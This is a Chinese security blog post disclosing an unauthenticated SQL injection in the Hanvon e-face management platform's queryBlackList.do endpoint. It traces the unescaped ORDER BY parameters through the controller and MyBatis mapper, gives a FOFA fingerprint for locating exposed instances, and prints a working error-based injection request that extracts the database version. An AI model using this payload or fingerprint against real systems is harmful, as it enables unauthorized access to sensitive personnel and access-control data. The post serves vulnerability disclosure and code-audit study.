---
title: "汉王e脸通综合管理平台 queryBlackList.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryBlackList-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryblacklist.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryBlackList.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/6 12:23
- 940浏览
- [0评论](#comment)
- 39分钟阅读

深入探索

软件

认证

安全

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryBlackList.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `BlackListController` 里关于 `queryBlackList` 的实现

```
@ResponseBody
@RequestMapping(
    value = {"/queryBlackList.do"},
    method = {RequestMethod.GET}
)
public RequestJson queryBlackList(@RequestParam(required = false,value = "keys") String keys, @RequestParam(required = false,value = "begin") String begin, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
    RequestJson requestJson = new RequestJson();
    BlackListParam blackListParam = new BlackListParam();

    try {
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        PageHelper.startPage(page, pageSize);
        blackListParam.setBegin(begin);
        blackListParam.setEnd(end);
        blackListParam.setColumnKey(columnKey);
        blackListParam.setOrder(order);
        blackListParam.setKeys(keys);
        List<BlackListConfigTpm> list = this.blackListAsm.queryBlackList(blackListParam);
        PageInfo<BlackListConfigTpm> info = new PageInfo(list);
        Map<String, Object> map = new HashMap();
        map.put("items", info.getList());
        map.put("numRows", info.getTotal());
        map.put("page", info.getPageNum());
        map.put("pageSize", info.getPageSize());
        requestJson = RequestJson.successResult(requestJson, map, getMessage("basics_query_success"));
    } catch (Exception e) {
        e.printStackTrace();
        String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
        requestJson = RequestJson.errorResult(requestJson, msg);
    }

    return requestJson;
}
```

深入探索

Web安全书籍

传输层安全性协议

漏洞修复方案

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 BlackListDsm.xml

代码安全审计

```
<select id="queryBlackList" parameterType="com.hanvon.iface.tpm.black_list.param.BlackListParam"
        resultMap="BaseResultMap">
    select
    bl.id, bl.ng_state,bl.ng_id_card, bl.ng_name, bl.ng_sex, bl.ng_plate_number, bl.ng_mobile, bl.ng_source,
    bl.ng_create_time, bl.ng_creator, bl.ng_photo_path, bl.ng_system_id, bl.ng_modify_time,bl.ng_remarks,
    su.sz_user_name as createName
    from black_list_config bl
    left join sys_user su on bl.ng_creator = su.ng_id
    where ng_state = 1
    <if test="keys != null">
        AND (
        ng_id_card like CONCAT('%',#{keys,jdbcType=VARCHAR},'%')
        OR ng_plate_number like CONCAT('%',#{keys,jdbcType=VARCHAR},'%')
        OR ng_mobile like CONCAT('%',#{keys,jdbcType=VARCHAR},'%')
        OR ng_name  like CONCAT('%',#{keys,jdbcType=VARCHAR},'%')
        )
    </if>
    <if test="begin != null and end !=null">
        AND ng_create_time BETWEEN #{begin} AND #{end}
    </if>

    ORDER BY
    <if test="order == null or order == ''">
        bl.ng_create_time desc
    </if>
    <if test="order != null and order != ''">
        ${columnKey} ${order}
    </if>

</select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/systemBlackList/queryBlackList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,(SELECT+(ELT(2920=2920,1))),0x7e),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryBlackList.do SQL注入漏洞](images/img-001-b4d517eec2e7.webp)](https://image.mrxn.net/771390c8f3344a9b82dc38df49c71acd.webp)

成功利用报错注入获取到数据版本号

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
